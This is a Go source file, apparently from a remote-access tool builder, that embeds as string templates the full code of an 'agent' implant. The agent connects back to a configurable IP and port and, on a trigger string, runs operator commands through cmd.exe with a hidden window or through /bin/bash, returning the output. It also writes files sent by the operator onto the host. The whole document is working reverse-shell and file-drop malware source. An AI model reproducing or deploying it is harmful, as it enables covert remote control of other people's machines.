package code

/*
*
agent的源代码
*
*/
var Main string = `package main

import (
	"CSagent/function"
	"CSagent/upload"
	"fmt"
)

var ip string
var port string

func main() {
connALL2:
	// time.Sleep(time.Second)
	for {
		conn := function.Conn_net()
		if conn == nil {
			continue
		}
	connALL:
		code, _ := function.Read_conn(conn)
		fmt.Println(code)
		if code == "Xioaruanshell" {
			for {
				pwd := function.GetPwd()
				function.Write_conn(conn, pwd)
				fmt.Println("路径写入成功")
				shell, err := function.Read_conn(conn)
				if shell == "no" {
					fmt.Println("取消链接")
					goto connALL
				}
				if err != nil {
					fmt.Println("读取错误:", err)
					break
				}
				output := function.ExecCode(shell)
				function.Write_conn(conn, output)
				out, err := function.Read_conn(conn)
				if out == "ok" {
					continue
				} else {
					break
				}
			}
		} else {
			for {
				file, err := function.Read_conn(conn)
				if file == "no" {
					fmt.Println("取消链接")
					goto connALL
				}
				if err != nil {
					fmt.Println("读取错误:", err)
					goto connALL2
				}
				/*获取成功*/
				upload.CreateFile(conn, file)
			}
		}
	}
}


`

var GosumAgent string = `
golang.org/x/text v0.14.0 h1:ScX5w1eTa3QqT8oi6+ziP7dTV1S2+ALU0bI+0zXKWiQ=
golang.org/x/text v0.14.0/go.mod h1:18ZOQIKpY8NJVqYksKHtTdi31H5itFRjB5/qKTNYzSU=

`
var GomodAgent string = `module CSagent

go 1.21.5

require golang.org/x/text v0.14.0

`

var Func_conn string = `package function

import (
	"fmt"
	"net"
)

func Conn_net() net.Conn {
	ip := "%v"
	port := "%v"
	ipaddr := fmt.Sprintf("%v:%v", ip, port)
	for {
		conn, err := net.Dial("tcp", ipaddr)
		if err == nil {
			return conn
		}
		return conn
	}
}

func Lis_net(port string) net.Conn {
	new_port := ":" + port
	lis, err := net.Listen("tcp", new_port)
	if err != nil {
		fmt.Println("监听错误")
	}
	fmt.Printf("开始监听 > %v", port)
	conn, _ := lis.Accept()
	return conn
}

func Read_conn(conn net.Conn) (string, error) {
	buf := make([]byte, 512)
	n, err := conn.Read(buf)
	if err != nil {
		fmt.Println("读取错误")
	}
	// fmt.Println(n)
	output := string(buf[:n])
	fmt.Println("output:", output)
	return output, err
}
func Write_conn(conn net.Conn, str string) {
	_, _ = conn.Write([]byte(str))
}

`

var Fun_exec string = `package function

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"

	"golang.org/x/text/encoding/simplifiedchinese"
)

func GetPwd() string {
	pwd, _ := os.Getwd()
	return pwd
}
func ExecCode(shell string) string {
	test := strings.Fields(shell)
	if test[0] == "cd" && len(test) > 1 {
		err := Cd_deal(shell)
		if err != nil {
			return "目录不存在"
		} else {
			pwd, _ := os.Getwd()
			_, _ = simplifiedchinese.GB18030.NewDecoder().String(string(pwd))
			return "change pwd !"
		}
	} else {

		cmd := exec.Command("cmd.exe", "/C", shell)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} //加入了取消黑窗口
		output, _ := cmd.CombinedOutput()
		out := output
		shell2, _ := simplifiedchinese.GB18030.NewDecoder().String(string(out))
		// fmt.Println(out)
		if shell2 == "" {
			return "无返回"
		}
		return shell2
	}
}

func Cd_deal(cmd string) error {
	workingDir, _ := os.Getwd()
	parts := strings.Fields(cmd)
	if parts[0] == "cd" && len(parts) > 1 {
		newDir := parts[1]
		if newDir == "-" {
			// 处理特殊情况：切换到上一个工作目录
			workingDir, _ = os.Getwd()
		} else {
			// 将相对路径转换为绝对路径
			if !filepath.IsAbs(newDir) {
				newDir = filepath.Join(workingDir, newDir)
			}

			// 检查新目录是否存在
			_, err := os.Stat(newDir)
			if err == nil {
				workingDir = newDir
			} else {
				// fmt.Println("目录不存在:", newDir)
				return err
			}
		}

		// 更新当前工作目录
		err := os.Chdir(workingDir)
		if err != nil {
			fmt.Println("切换目录失败:", err)
			return err
		}

	}
	return nil
}



`

var Fun_use string = `package function

import (
	"bufio"
	"math/rand"
	"os"
	"time"
)

func Scanf(a *string) {
	reader := bufio.NewReader(os.Stdin)
	data, _, _ := reader.ReadLine()

	*a = string(data)
}

func RandNum() int {
	rand.Seed(time.Now().UnixNano()) //时间戳为种子
	r := rand.Intn(65535)
	return r
}

`

var AgentexecLinux string = `package function


import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"golang.org/x/text/encoding/simplifiedchinese"
)



func GetPwd() string {
	pwd, _ := os.Getwd()
	return pwd
}
func ExecCode(shell string) string {
	test := strings.Fields(shell)
	if test[0] == "cd" && len(test) > 1 {
		err := Cd_deal(shell)
		if err != nil {
			return "目录不存在"
		} else {
			pwd, _ := os.Getwd()
			_, _ = simplifiedchinese.GB18030.NewDecoder().String(string(pwd))
			return "change pwd !"
		}
	} else {

		cmd := exec.Command("/bin/bash", "-c", shell)
		output, _ := cmd.CombinedOutput()
		out := string(output)
		return out
	}
}

func Cd_deal(cmd string) error {
	workingDir, _ := os.Getwd()
	parts := strings.Fields(cmd)
	if parts[0] == "cd" && len(parts) > 1 {
		newDir := parts[1]
		if newDir == "-" {
			// 处理特殊情况：切换到上一个工作目录
			workingDir, _ = os.Getwd()
		} else {
			// 将相对路径转换为绝对路径
			if !filepath.IsAbs(newDir) {
				newDir = filepath.Join(workingDir, newDir)
			}

			// 检查新目录是否存在
			_, err := os.Stat(newDir)
			if err == nil {
				workingDir = newDir
			} else {
				fmt.Println("目录不存在:", newDir)
				return err
			}
		}

		// 更新当前工作目录
		err := os.Chdir(workingDir)
		if err != nil {
			fmt.Println("切换目录失败:", err)
			return err
		}

	}
	return nil
}`

var Upload_agent_win_upload string = `package upload

import (
	"bufio"
	"encoding/binary"
	"fmt"
	"net"
	"os"
)

func CreateFile(conn net.Conn, file string) {
	disfile, _ := os.OpenFile(file, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0666)
	witer := bufio.NewWriter(disfile)
	total := 0
	// fmt.Println(witer, total)
	//接受文件大小
	namebuf := make([]byte, 10)
	n_name, e := conn.Read(namebuf)
	SHandleError(e, "read")
	size := byte_to_int64(namebuf[:n_name])
	filebuf := make([]byte, 1000)
	for {
		n, e := conn.Read(filebuf)
		SHandleError(e, "readfile")
		total += n
		witer.Write(filebuf[:n])
		witer.Flush()
		fmt.Printf("正在写入%v,共计%v\n", n, total)
		if total == int(size) {
			fmt.Println("文件传输完毕")
			disfile.Close()
			break
		}
	}

}

func byte_to_int64(byte []byte) int64 {
	return int64(binary.BigEndian.Uint64(byte))
}
func SHandleError(err error, when string) {
	if err != nil {
		fmt.Println("服务端异常退出，err=", err, when)
		return
	}
}

`
